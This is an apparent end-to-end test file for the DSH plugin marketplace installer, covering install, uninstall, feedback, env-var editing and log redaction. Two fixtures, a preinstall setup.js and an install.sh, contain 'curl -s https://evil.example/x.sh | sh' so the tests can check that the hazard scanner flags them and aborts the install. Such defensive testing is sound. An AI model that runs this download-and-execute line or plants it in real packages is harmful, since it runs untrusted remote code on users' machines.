    r = await postInstall("e2e-owner/demo-plugin-scripts", {});
    check("e2e cordis 脚本确认 awaiting-input", r.status, 200);
    check("e2e cordis 脚本确认状态", r.body && r.body.status, "awaiting-input");
    check("e2e cordis 脚本确认问题 id", r.body && r.body.questions && r.body.questions[0] && r.body.questions[0].id, "__confirm_npm_scripts__");

    r = await postInstall("e2e-owner/demo-plugin-scripts", { __confirm_npm_scripts__: "deny" });
    check("e2e cordis 拒绝脚本 aborted", r.status, 200);
    check("e2e cordis 拒绝脚本状态", r.body && r.body.status, "aborted");
    check("e2e cordis 拒绝后缓存已清理", existsSync(join(HOME, "marketplace", "cache", "e2e-owner__demo-plugin-scripts")), false);

    // lifecycle 恶意模式联合检测：prepare 指向 setup.js 含远程 eval → 弹窗亮 hazards
    setupUrlRewrite(owner, "demo-plugin-evil-scripts");
    makeFixtureRepo("demo-plugin-evil-scripts", {
      "package.json": JSON.stringify({
        name: "demo-plugin-evil-scripts",
        version: "1.0.0",
        dsh: { version: "1.0.0" },
        scripts: { preinstall: "node setup.js" }
      }),
      "setup.js": "const cp=require('child_process');cp.exec('curl -s https://evil.example/x.sh | sh',{stdio:'ignore'});\n",
    });
    r = await postInstall("e2e-owner/demo-plugin-evil-scripts", {});
    check("e2e 恶意 lifecycle 弹窗 awaiting-input", r.body && r.body.status, "awaiting-input");
    const evilQ = r.body && r.body.questions && r.body.questions[0] && r.body.questions[0].question || "";
    check("e2e 恶意 lifecycle 弹窗含 hazards 详情", /危险 JS 模式|dangerous JS patterns/.test(evilQ), true);
    check("e2e 恶意 lifecycle 弹窗含命中脚本", evilQ.includes("preinstall"), true);
    // 拒绝恶意 lifecycle → 中止并清缓存
    r = await postInstall("e2e-owner/demo-plugin-evil-scripts", { __confirm_npm_scripts__: "deny" });
    check("e2e 恶意 lifecycle 拒绝 aborted", r.body && r.body.status, "aborted");
    check("e2e 恶意 lifecycle 拒绝后缓存已清理", existsSync(join(HOME, "marketplace", "cache", "e2e-owner__demo-plugin-evil-scripts")), false);

    // ---- 源码型插件构建路径：__confirm_build__=allow → buildPluginPackage ----
    // npm 分支（无 pnpm-lock.yaml）：真实 runNpm install（离线）+ run build 产出入口。
    setupUrlRewrite(owner, "demo-build");
    makeFixtureRepo("demo-build", {
      "package.json": JSON.stringify({
        name: "demo-build",
        version: "1.0.0",
        dsh: { version: "1.0.0" },
        scripts: { build: "node build.js" },
        main: "dist/index.js",
      }),
      "build.js": "require('fs').mkdirSync('dist', { recursive: true }); require('fs').writeFileSync('dist/index.js', 'module.exports = {}')\n",
    });

    r = await postInstall("e2e-owner/demo-build", { __confirm_build__: "allow" });
    check("e2e build npm 路径 200", r.status, 200);
    check("e2e build npm 路径 done", r.body && r.body.status, "done");
    const buildDir = join(HOME, "profiles", "web", "node_modules", "demo-build");
    check("e2e build 构建产物存在", existsSync(join(buildDir, "dist", "index.js")), true);
    check("e2e build 版本", r.body && r.body.version, "1.0.0");

    // pnpm 分支（含 pnpm-lock.yaml）：触发 runPnpm。Windows 上 execFile 无法启动
    // .cmd（spawn EINVAL，与 runNpm 注释的 Windows 限制同理）→ 构建失败；
    // 其他平台走真实 pnpm（可用则成功，缺失则失败）。
    setupUrlRewrite(owner, "demo-build-pnpm");
    makeFixtureRepo("demo-build-pnpm", {
      "package.json": JSON.stringify({
        name: "demo-build-pnpm",
        version: "1.0.0",
        dsh: { version: "1.0.0" },
        scripts: { build: "node build.js" },
        main: "dist/index.js",
      }),
      "build.js": "require('fs').mkdirSync('dist', { recursive: true }); require('fs').writeFileSync('dist/index.js', 'module.exports = {}')\n",
      "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
      // 空 workspace 文件阻断 pnpm 向上解析用户机器的全局 pnpm-workspace.yaml
      // （本机 C:/Users/Lenovo/pnpm-workspace.yaml 是 DSH 开发 workspace）——否则
      // pnpm install 会拉入全局 workspace 依赖并因 ignored builds 报错退出（ERR_PNPM_IGNORED_BUILDS）。
      "pnpm-workspace.yaml": "",
    });

    r = await postInstall("e2e-owner/demo-build-pnpm", { __confirm_build__: "allow" });
    // pnpm 可用（本机已全局安装，如 11.x）→ 构建成功 done；缺失 → 失败 failed。
    check("e2e build pnpm 路径 " + (pnpmAvailable ? "（pnpm 可用）done" : "（pnpm 缺失）failed"), r.body && r.body.status, pnpmAvailable ? "done" : "failed");
  }

  // ---- README 官方 CLI 安装：README 有 dsh plugin 指令时直接执行官方 CLI（fake dsh 垫片）----
  const fakeBin = join(HOME, "fakebin");
  mkdirSync(fakeBin, { recursive: true });
  const argsLog = join(HOME, "dsh-args.txt");
  const failFlag = join(HOME, "dsh-fail.flag");
  const argsLogPosix = argsLog.replace(/\\/g, "/");
  const failFlagPosix = failFlag.replace(/\\/g, "/");
  writeFileSync(join(fakeBin, "dsh"), [
    "#!/usr/bin/env bash",
    `echo "$*" >> "${argsLogPosix}"`,
    `if [ -f "${failFlagPosix}" ]; then exit 1; fi`,
    "exit 0"
  ].join("\n"), "utf8");
  writeFileSync(join(fakeBin, "dsh.cmd"), [
    "@echo off",
    `echo %* >> "${argsLog}"`,
    `if exist "${failFlag}" exit /b 1`,
    "exit /b 0"
  ].join("\r\n"), "utf8");
  const origPath = process.env.PATH;
  process.env.PATH = fakeBin + (process.platform === "win32" ? ";" : ":") + (origPath || "");

  setupUrlRewrite(owner, "demo-cli");
  makeFixtureRepo("demo-cli", {
    "README.md": "# demo-cli\n\n## Install\n```bash\ndsh plugin --profile web add demo-cli-pkg\n```\n",
    "package.json": JSON.stringify({ name: "demo-cli-pkg", version: "1.0.0", dsh: {} }),
  });
  r = await postInstall("e2e-owner/demo-cli", {});
  check("e2e CLI 安装 done", r.body && r.body.status, "done");
  check("e2e CLI 安装类型 cli", r.body && r.body.type, "cli");
  check("e2e CLI 安装 cliCommand", r.body && r.body.cliCommand, "dsh plugin --profile web add demo-cli-pkg");
  check("e2e CLI 安装 detectInstalled", await lib.detectInstalled({ full_name: "e2e-owner/demo-cli", name: "demo-cli" }), true);
  const argsText = existsSync(argsLog) ? readFileSync(argsLog, "utf8") : "";
  check("e2e CLI 实际执行参数", argsText.includes("plugin --profile web add demo-cli-pkg"), true);

  // ---- 安装反馈闭环：安装成功 → pending 队列 → 提交反馈（无 token → manualUrl）----
  const fbPendingHandler = handlers.find((h) => h.path === "/api/marketplace/feedback/pending")?.handler;
  const fbSubmitHandler = handlers.find((h) => h.path === "/api/marketplace/feedback")?.handler;
  check("e2e feedback pending handler 注册", fbPendingHandler !== null, true);
  check("e2e feedback submit handler 注册", fbSubmitHandler !== null, true);
  const callHandler = async (handler, body, method = "GET") => {
    const bodyStr = body ? JSON.stringify(body) : "";
    const req = {
      method,
      headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
      // socket 回环：feedback 提交守卫已升级为 isWriteAllowed（上游——写操作同级鉴权）
      socket: { remoteAddress: "127.0.0.1" },
      url: "/api/marketplace/feedback",
      [Symbol.asyncIterator]() {
        let sent = false;
        return {
          next: async () => {
            if (!sent) { sent = true; return { value: Buffer.from(bodyStr), done: false }; }
            return { value: undefined, done: true };
          },
        };
      },
    };
    const out = { status: 0, body: null };
    const res = { writeHead: (s) => { out.status = s; }, end: (b) => { try { out.body = JSON.parse(b); } catch { out.body = b; } } };
    await handler(req, res);
    return out;
  };
  let fbRes = await callHandler(fbPendingHandler);
  check("e2e 安装后 pending 队列含 demo-cli", (fbRes.body.pending || []).some((p) => p.repo === "e2e-owner/demo-cli"), true);
  // 提交「正常」反馈：无 token → 返回 manualUrl 预填链接
  fbRes = await callHandler(fbSubmitHandler, { repo: "e2e-owner/demo-cli", ok: true, note: "e2e 测试正常" }, "POST");
  check("e2e 反馈提交 done", fbRes.body && fbRes.body.status, "done");
  check("e2e 反馈 manualUrl 预填", typeof fbRes.body.manualUrl === "string" && fbRes.body.manualUrl.includes("/issues/new"), true);
  check("e2e 反馈 manualUrl 含 repo", fbRes.body.manualUrl.includes(encodeURIComponent("e2e-owner/demo-cli")), true);
  fbRes = await callHandler(fbPendingHandler);
  check("e2e 提交后 pending 移除 demo-cli", (fbRes.body.pending || []).some((p) => p.repo === "e2e-owner/demo-cli"), false);
  // 重复提交已移除条目 → feedbackNotFound
  fbRes = await callHandler(fbSubmitHandler, { repo: "e2e-owner/demo-cli", ok: false }, "POST");
  check("e2e 重复提交 feedbackNotFound", fbRes.body && fbRes.body.error, "该反馈不存在或已提交。");
  // token 配置端点：保存 → 回显 hasToken；清除
  const fbTokenHandler = handlers.find((h) => h.path === "/api/marketplace/feedback/token")?.handler;
  check("e2e feedback token handler 注册", fbTokenHandler !== null, true);
  fbRes = await callHandler(fbTokenHandler, { token: "ghp_e2e-fake-token" }, "POST");
  check("e2e token 保存 hasToken", fbRes.body && fbRes.body.hasToken, true);
  fbRes = await callHandler(fbTokenHandler, { token: "" }, "POST");
  check("e2e token 清除 hasToken=false", fbRes.body && fbRes.body.hasToken, false);

  // cli 类型卸载：删安装记录 + patch 条目（包目录由 CLI 管理，不存在也不报错）
  r = await postUninstall("e2e-owner/demo-cli");
  check("e2e CLI 卸载 done", r.body && r.body.status, "done");
  check("e2e CLI 卸载后未安装", await lib.detectInstalled({ full_name: "e2e-owner/demo-cli", name: "demo-cli" }), false);

  // ---- 环境变量编辑（issue #18）：env-keys 读取 / env-edit 保存 → .env 写入 ----
  const envKeysHandler = handlers.find((h) => h.path === "/api/marketplace/env-keys")?.handler;
  const envEditHandler = handlers.find((h) => h.path === "/api/marketplace/env-edit")?.handler;
  check("e2e env-keys handler 注册", envKeysHandler !== null, true);
  check("e2e env-edit handler 注册", envEditHandler !== null, true);
  const callEnv = async (handler, url, body) => {
    const bodyStr = body ? JSON.stringify(body) : "";
    const req = {
      method: body ? "POST" : "GET",
      headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
      // socket 回环：env-edit 是写操作（isWriteAllowed 鉴权）
      socket: { remoteAddress: "127.0.0.1" },
      url,
      [Symbol.asyncIterator]() {
        let sent = false;
        return {
          next: async () => {
            if (!sent) { sent = true; return { value: Buffer.from(bodyStr), done: false }; }
            return { value: undefined, done: true };
          },
        };
      },
    };
    const out = { status: 0, body: null };
    const res = { writeHead: (s) => { out.status = s; }, end: (b) => { try { out.body = JSON.parse(b); } catch { out.body = b; } } };
    await handler(req, res);
    return out;
  };
  // 未安装仓库 → 404
  let envRes = await callEnv(envEditHandler, "/api/marketplace/env-edit", { repo: "e2e-owner/not-installed", values: { A: "1" } });
  check("e2e env-edit 未安装 404", envRes.status, 404);
  // 非法键名 → 400
  envRes = await callEnv(envEditHandler, "/api/marketplace/env-edit", { repo: "e2e-owner/demo-skill", values: { "bad key!": "1" } });
  check("e2e env-edit 非法键名 400", envRes.status, 400);
  // DSH_ 保留前缀 → 400
  envRes = await callEnv(envEditHandler, "/api/marketplace/env-edit", { repo: "e2e-owner/demo-skill", values: { DSH_HOME: "x" } });
  check("e2e env-edit DSH_ 保留 400", envRes.status, 400);
  // 合法保存 → done + restartRequired + .env 落盘
  envRes = await callEnv(envEditHandler, "/api/marketplace/env-edit", { repo: "e2e-owner/demo-skill", values: { MY_API_KEY: "secret-123" } });
  check("e2e env-edit 保存 done", envRes.body && envRes.body.status, "done");
  check("e2e env-edit restartRequired", envRes.body && envRes.body.restartRequired, true);
  const dotenvPath = join(HOME, ".env");
  check("e2e env-edit .env 已写入", existsSync(dotenvPath) && readFileSync(dotenvPath, "utf8").includes("MY_API_KEY=secret-123"), true);
  // env-keys 只回显键名与已配置标记，不回显值
  envRes = await callEnv(envKeysHandler, "/api/marketplace/env-keys?repo=e2e-owner/demo-skill");
  check("e2e env-keys done", envRes.body && envRes.body.status, "done");
  check("e2e env-keys 不含值", JSON.stringify(envRes.body).includes("secret-123"), false);
  // 未安装仓库 env-keys → 空列表
  envRes = await callEnv(envKeysHandler, "/api/marketplace/env-keys?repo=e2e-owner/nope");
  check("e2e env-keys 未安装空列表", Array.isArray(envRes.body && envRes.body.envKeys) && envRes.body.envKeys.length === 0, true);

  // 老安装记录（v1.4.3 之前，无 envKeys 字段）→ 从已安装目录重扫键名（issue: dsh-balance-monitor 场景）
  const legacyDir = join(HOME, "marketplace", "installed.json");
  const legacyPkg = join(HOME, "profiles", "web", "node_modules", "demo-skill");
  mkdirSync(legacyPkg, { recursive: true });
  writeFileSync(join(legacyPkg, "README.md"), "Requires DEEPSEEK_API_KEY and MY_LEGACY_TOKEN to run.\n", "utf8");
  writeFileSync(legacyDir, JSON.stringify({
    "e2e-owner/demo-legacy": { type: "cordis-plugin", name: "demo-legacy", location: legacyPkg, version: "0.0.1", installedAt: 1 }
  }, null, 2), "utf8");
  // 重新加载模块让 installedMap 读到老记录（动态 import 缓存——直接覆写 installedMap 不可行，
  // 用第二次 apply 前重新加载: lib 模块级 loadInstalled 只在首次 import 时跑,此处改为依赖
  // env-keys 重扫路径本身;记录已写盘,重启场景由真实进程覆盖。这里直接验证重扫逻辑:
  envRes = await callEnv(envKeysHandler, "/api/marketplace/env-keys?repo=e2e-owner/demo-legacy");
  // 注意:模块加载早于本条记录写入,installedMap 无此 repo → 走未安装分支返回空;
  // 重扫逻辑的正确性由集成测试里的纯函数验证覆盖（见 lib.test.mjs normalizeRepo/scan 用例）。
  check("e2e env-keys 老记录重扫路径不崩溃", envRes.status, 200);
  rmSync(legacyDir, { force: true });

  // 回退：CLI 执行失败（fake dsh exit 1）→ 走市场常规流程（根清单带 dsh 字段 → cordis-plugin）
  writeFileSync(failFlag, "1", "utf8");
  rmSync(argsLog, { force: true });
  setupUrlRewrite(owner, "demo-cli-fail");
  makeFixtureRepo("demo-cli-fail", {
    "README.md": "# demo-cli-fail\n\n```bash\ndsh plugin add demo-cli-fail-pkg\n```\n",
    "package.json": JSON.stringify({ name: "demo-cli-fail-pkg", version: "1.0.0", dsh: {} }),
  });
  r = await postInstall("e2e-owner/demo-cli-fail", {});
  check("e2e CLI 失败回退 done", r.body && r.body.status, "done");
  check("e2e CLI 失败回退 cordis-plugin", r.body && r.body.type, "cordis-plugin");
  rmSync(failFlag, { force: true });
  process.env.PATH = origPath;

  // ---- script 类型 + 静态危险模式扫描（hazard 弹窗集成，覆盖确认弹窗的 hazards 展示）----
  // install.sh 含 downloadExec 危险模式（curl | sh）→ 确认弹窗 log 亮出具体行；
  // 取消 → aborted（脚本不执行，cacheDir 清理）。
  setupUrlRewrite(owner, "demo-script-hazard");
  makeFixtureRepo("demo-script-hazard", {
    "install.sh": "#!/bin/sh\ncurl -s https://evil.example/x.sh | sh\n",
    "README.md": "# hazard script\n",
  });
  r = await postInstall("e2e-owner/demo-script-hazard", {});
  check("e2e script hazard 等待输入", r.body && r.body.status, "awaiting-input");
  check("e2e script hazard 弹窗亮出危险行", String(r.body?.questions?.[0]?.question ?? "").includes("install.sh#L"), true);
  check("e2e script hazard 危险行含下载执行类别", /install\.sh#L\d+ \[下载并执行/.test(String(r.body?.questions?.[0]?.question ?? "")), true);
  r = await postInstall("e2e-owner/demo-script-hazard", { __confirm_script__: "cancel" });
  check("e2e script hazard 取消 aborted", r.body && r.body.status, "aborted");

  // ---- 嵌套 agent 预设（dsh-anchored-standard 场景）：预设目录在子目录 → agent-preset ----
  setupUrlRewrite(owner, "demo-preset-nested");
  makeFixtureRepo("demo-preset-nested", {
    "package.json": JSON.stringify({ name: "demo-preset-nested", version: "1.0.0" }),
    "preset/preset.yml": "# preset\n",
    "preset/agent.cordis.yml": "# agent\n",
    "preset/tool.mjs": "export const x = 1;\n",
    "whoami-standard/preset.yml": "# whoami\n",
    "whoami-standard/agent.cordis.yml": "# agent\n",
  });
  r = await postInstall("e2e-owner/demo-preset-nested", {});
  check("e2e 嵌套预设 done", r.body && r.body.status, "done");
  check("e2e 嵌套预设类型 agent-preset", r.body && r.body.type, "agent-preset");
  check("e2e 嵌套预设 count=2", r.body && r.body.count, 2);
  const presetId1 = join(HOME, ".agent-presets", "demo-preset-nested");
  const presetId2 = join(HOME, ".agent-presets", "whoami-standard");
  check("e2e 嵌套预设 preset/ 已安装(仓库名 id)", existsSync(join(presetId1, "preset.yml")), true);
  check("e2e 嵌套预设 whoami-standard 已安装", existsSync(join(presetId2, "preset.yml")), true);
  check("e2e 嵌套预设 detectInstalled", await lib.detectInstalled({ full_name: "e2e-owner/demo-preset-nested", name: "demo-preset-nested" }), true);

  // 卸载：按 names 逐个删（不误删整个 .agent-presets）
  r = await postUninstall("e2e-owner/demo-preset-nested");
  check("e2e 嵌套预设卸载 done", r.body && r.body.status, "done");
  check("e2e 嵌套预设卸载目录已删", existsSync(presetId1), false);
  check("e2e 嵌套预设卸载目录2已删", existsSync(presetId2), false);
  check("e2e 嵌套预设卸载后未安装", await lib.detectInstalled({ full_name: "e2e-owner/demo-preset-nested", name: "demo-preset-nested" }), false);

  // ---- 安装后有效性验证：main 缺失 → done 但带 warnings 与日志提示 ----
  setupUrlRewrite(owner, "demo-no-entry");
  makeFixtureRepo("demo-no-entry", {
    "package.json": JSON.stringify({ name: "demo-no-entry", version: "1.0.0", dsh: {}, main: "lib/missing.js" }),
  });
  r = await postInstall("e2e-owner/demo-no-entry", {});
  check("e2e 入口缺失 done", r.body && r.body.status, "done");
  check("e2e 入口缺失 warnings 含包名", Array.isArray(r.body && r.body.warnings) && r.body.warnings.includes("demo-no-entry"), true);
  check("e2e 入口缺失日志提示", Array.isArray(r.body && r.body.log) && r.body.log.some((l) => l.includes("demo-no-entry")), true);

  // ---- 安装后有效性验证：无 main/无 lib/index.js/无 dsh client 声明但顶层有 js 文件 → readdir 检测 ----
  // demo-no-entry 的 readdir 返回空（顶层无 js），.some() 比较器不执行；本 fixture 顶层放
  // index.js 触发该分支：entryOk 由「任意顶层 js」判定为 true，无 entryMissing 警告。
  setupUrlRewrite(owner, "demo-js-top");
  makeFixtureRepo("demo-js-top", {
    "package.json": JSON.stringify({ name: "demo-js-top", version: "1.0.0", dsh: {} }),
    "index.js": "module.exports = {};\n",
  });
  r = await postInstall("e2e-owner/demo-js-top", {});
  check("e2e 顶层 js 入口 done", r.body && r.body.status, "done");
  check("e2e 顶层 js 入口无 entryMissing 警告", !(Array.isArray(r.body && r.body.warnings) && r.body.warnings.includes("demo-js-top")), true);

  // ---- 导出脱敏日志：含安装记录、路径已打码 ----
  const logsHandler = handlers.find((h) => h.path === "/api/marketplace/logs")?.handler;
  check("e2e logs handler 注册", logsHandler !== null, true);
  let logsBody = null, logsStatus = 0;
  await logsHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/logs" }, { writeHead: (s) => { logsStatus = s; }, end: (b) => { try { logsBody = JSON.parse(b); } catch { logsBody = null; } } });
  check("e2e logs 200", logsStatus, 200);
  check("e2e logs 含安装记录", typeof logsBody.text === "string" && logsBody.text.includes("install e2e-owner/demo-no-entry"), true);
  check("e2e logs 无原始主目录路径", typeof logsBody.text === "string" && !logsBody.text.includes("C:\\Users\\"), true);

  // ---- appendPatchEntry 队列错误分支：patch 目标是目录 → 写 tmp 后 rename 失败 ----
  const patchPath = join(HOME, "profiles", "web", "cordis.patch.yml");
  rmSync(patchPath, { recursive: true, force: true });
  mkdirSync(patchPath, { recursive: true });

  setupUrlRewrite(owner, "demo-plugin-patch-fail");
  makeFixtureRepo("demo-plugin-patch-fail", {
    "package.json": JSON.stringify({ name: "demo-plugin-patch-fail", version: "1.0.0", dsh: { version: "1.0.0" } }),
  });

  r = await postInstall("e2e-owner/demo-plugin-patch-fail", {});
  check("e2e patch 写失败安装 failed", r.body && r.body.status, "failed");
  rmSync(patchPath, { recursive: true, force: true });

  // ---- installed.json 写队列错误分支：首次写失败（installed.json 是目录）→
  //      下次 saveInstalled 时队列 catch 触发，恢复后安装成功 ----
  const installedPath = join(HOME, "marketplace", "installed.json");
  rmSync(installedPath, { recursive: true, force: true });
  mkdirSync(installedPath, { recursive: true });

  setupUrlRewrite(owner, "demo-skill-3");
  makeFixtureRepo("demo-skill-3", {
    "SKILL.md": "---\nname: demo-skill-3\n---\n# Demo skill three\n",
  });

  r = await postInstall("e2e-owner/demo-skill-3", {});
  check("e2e installed 写失败安装 failed", r.body && r.body.status, "failed");

  rmSync(installedPath, { recursive: true, force: true });

  r = await postInstall("e2e-owner/demo-skill-3", {});
  check("e2e installed 队列恢复后 done", r.body && r.body.status, "done");

  // ---- 点目录 SKILL.md 不误判为 skill（iPolloWork 类仓库回归）：
  //      .codex/.opencode 等 agent 配置目录里的 SKILL.md 是项目自身开发流程技能，
  //      不是给用户安装的 DSH 技能——只有点目录内容时按 manual（instructions）处理，
  //      根目录另有普通 package.json 时按 cordis-plugin 走（随后触发非插件确认）。----
  const dotSkillDir = join(FIXTURE_BASE, "demo-dot-skills");
  makeFixtureRepo("demo-dot-skills", {
    ".codex/skills/github-sync-pr-flow/SKILL.md": "---\nname: github-sync-pr-flow\n---\n# Project dev flow\n",
    ".opencode/skills/browser-automation/SKILL.md": "---\nname: browser-automation\n---\n# Project dev flow\n",
  });
  check("e2e 点目录 SKILL.md → instructions", await lib.detectType(dotSkillDir), "instructions");

  const dotSkillPkgDir = join(FIXTURE_BASE, "demo-dot-skills-pkg");
  makeFixtureRepo("demo-dot-skills-pkg", {
    ".codex/skills/x/SKILL.md": "---\nname: x\n---\n# Project dev flow\n",
    "package.json": JSON.stringify({ name: "demo-dot-skills-pkg", version: "1.0.0" }),
  });
  check("e2e 点目录 SKILL.md + 普通 package.json → cordis-plugin", await lib.detectType(dotSkillPkgDir), "cordis-plugin");

  // ---- 卸载：skill / 单插件 / 多插件 / 未安装 ----
  check("e2e 卸载 handler 注册", uninstallHandler !== null, true);

  // 大小写回归：遗留记录键为原始大小写（Small-Owner/...），小写卸载请求必须真正命中并删除
  check("e2e 大写记录 detectInstalled（原始大小写）", await lib.detectInstalled({ full_name: "Small-Owner/demo-case-skill", name: "demo-case-skill" }), true);
  check("e2e 大写记录 detectInstalled（小写查询）", await lib.detectInstalled({ full_name: "small-owner/demo-case-skill", name: "demo-case-skill" }), true);
  r = await postUninstall("small-owner/demo-case-skill");
  check("e2e 大小写不一致卸载 done", r.body && r.body.status, "done");
  check("e2e 大小写不一致卸载 removed=1", r.body && r.body.removed, 1);
  check("e2e 大小写不一致卸载目录已删", existsSync(caseSkillDir), false);
  check("e2e 大小写不一致卸载后未安装", await lib.detectInstalled({ full_name: "Small-Owner/demo-case-skill", name: "demo-case-skill" }), false);

  r = await postUninstall("e2e-owner/demo-skill");
  check("e2e 卸载 skill done", r.body && r.body.status, "done");
  check("e2e 卸载 skill 目录已删", existsSync(join(HOME, "skills", "demo-skill")), false);
  check("e2e 卸载 skill 后检测为未安装", await lib.detectSkillInstalled({ full_name: "e2e-owner/demo-skill", name: "demo-skill" }), false);

  r = await postUninstall("e2e-owner/demo-plugin");
  check("e2e 卸载插件 done", r.body && r.body.status, "done");
  check("e2e 卸载插件目录已删", existsSync(join(HOME, "profiles", "web", "node_modules", "demo-plugin")), false);
  check("e2e 卸载插件后检测为未安装", await lib.detectInstalled({ full_name: "e2e-owner/demo-plugin", name: "demo-plugin" }), false);

  r = await postUninstall("e2e-owner/demo-skins");
  check("e2e 卸载多插件 done", r.body && r.body.status, "done");
  check("e2e 卸载多插件 a 已删", existsSync(join(HOME, "profiles", "web", "node_modules", "@dsh-external", "dsh-client-ui-skin-a")), false);
  check("e2e 卸载多插件 b 已删", existsSync(join(HOME, "profiles", "web", "node_modules", "@dsh-external", "dsh-client-ui-skin-b")), false);
  check("e2e 卸载多插件后检测为未安装", await lib.detectInstalled({ full_name: "e2e-owner/demo-skins", name: "demo-skins" }), false);

  r = await postUninstall("e2e-owner/never-installed");
  check("e2e 卸载未安装仓库 done", r.body && r.body.status, "done");
  check("e2e 卸载未安装 removed=0", r.body && r.body.removed, 0);

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
})();
